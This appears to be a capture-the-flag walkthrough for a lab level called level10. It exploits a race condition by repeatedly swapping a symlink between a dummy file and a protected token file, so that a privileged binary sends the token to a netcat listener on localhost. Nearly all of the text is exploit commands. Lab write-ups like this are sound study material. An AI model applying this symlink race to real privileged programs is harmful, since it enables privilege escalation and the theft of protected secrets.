
# Race conditions

# Open second ssh-session 
ssh level10@192.168.64.2 -p 4242

# Run server on 6969 port in one shell
nc -kl 6969

# Go to the /var/crash
cd /var/crash

# Create bash script with that code:
#!/bin/bash
touch /tmp/fake;
while true; do ln -fs ~/token /tmp/link; ln -fs /tmp/fake /tmp/link; done

# Give exec access bit and run in backgroud
chmod +x exp.sh
./exp.sh &

# Run level10
./level10 /tmp/link 127.0.0.1